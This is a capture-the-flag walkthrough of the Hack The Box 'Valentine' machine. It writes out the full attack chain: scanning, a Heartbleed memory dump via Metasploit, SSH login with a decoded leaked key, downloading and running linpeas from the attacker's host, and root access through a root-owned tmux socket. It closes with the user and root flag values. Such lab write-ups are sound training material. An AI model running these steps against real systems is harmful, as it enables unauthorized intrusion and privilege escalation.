# Valentine - Easy

```shell
sudo vim /etc/hosts
#add valentine.htb

nmap -T4 -p- -A -Pn -v valentine.htb

nmap --script ssl-heartbleed -p 443 -A -v valentine.htb
#scan port 443 for heartbleed vulnerability

gobuster dir -u http://valentine.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml -t 50

msfconsole -q

use auxiliary/scanner/ssl/openssl_heartbleed

set VERBOSE true

set LEAK_COUNT 3

set RHOSTS valentine.htb

run
#dumps memory
#read through it

#go through gobuster scan
#/dev contains hype_key
#decode to get rsa key

vim hype_key
#paste key contents

chmod 600 hype_key

ssh -i hype_key hype@valentine.htb
#use passphrase found earlier
#gives pubkey error
#we need to use ssh-rsa flag

ssh -i hype.key -o PubkeyAcceptedKeyTypes=+ssh-rsa hype@valentine.htb
#this works

cat user.txt

#in attacker machine
python3 -m http.server

#in hype ssh
wget http://10.10.14.2:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#linpeas shows tmux process running as root
#run same command
/usr/bin/tmux -S /.devs/dev_sess

#we get root shell
cat /root/root.txt
```

* Open ports & services:

  * 22 - ssh - OpenSSH 5.9p1 (Ubuntu)
  * 80 - http - Apache httpd 2.2.22 (Ubuntu)
  * 443 - ssl/http - Apache httpd 2.2.22

* Checking the webpage on port 80, we can see an image of a woman and a heart.

* The image of the heart used here is the same as the one used for [HeartBleed](https://heartbleed.com/)

* We can confirm that by checking the webpage on 443 (which is using SSL).

* Using the ```ssl-heartbleed``` script with ```nmap``` to scan port 443, it shows that the version of ```OpenSSL``` used is vulnerable.

* We can scan the web directories on port 80 in the background, and attempt to exploit ```heartbleed```.

* Using ```Metasploit```, we can search, configure and execute the ```heartbleed``` exploit - this dumps the memory.

* Going through the memory dump, we find the following pieces of information:

  * We get a MD5 hash, but we are unable to crack it
  
  * We get a base64-encoded string, which when decoded gives the string "heartbleedbelievethehype"

  * We get the request headers for a page /decode.php

* Now, if we check the page /decode.php on port 443, we get a standard page for decoding input.

* It links to /encode.php, which encodes input.

* These pages decode and encode from/to base64, and we can test by submitting input.

* Going back to our ```gobuster``` scan, we can see a directory /dev

* This directory (on port 80) includes two files - 'notes.txt' and 'hype_key'.

* 'notes.txt' does not contain anything useful.

* 'hype_key' contains hex text - we can decode it using ```Cyberchef``` using the recipe 'From Hex'.

* This gives us the contents of a RSA key file - as the filename is labelled 'hype_key', this could be for an user named 'hype'.

* We can save the contents to a keyfile, and modify its permissions.

* Attempting to login as 'hype' via SSH, when asked for a passphrase, we can use the base64-decoded string found earlier.

* While logging in, we get an error "sign_and_send_pubkey: no mutual signature supported".

* This can be resolved by adding 'ssh-rsa' as an accepted key type while logging in.

* We can login as 'hype' and get user flag.

* For privesc, we can attempt to use ```linpeas```.

* As this is an older machine, it shows multiple possible exploit routes:

  * Kernel exploit for 3.2.0-23-generic
  * ```dirtycow```
  * ```tmux``` running as root

* We can attempt to exploit ```tmux``` running as root in this case.

* ```linpeas``` shows the ```tmux``` process running:

```/usr/bin/tmux -S /.devs/dev_sess```

* So, we can simply use the same command to get ```tmux``` session as root, and read root flag.

```markdown
1. User flag - 9f09ce8a084fd705150e4cf3cd4431e8

2. Root flag - daa07f5036baa9ce77507a4849afa69e
```
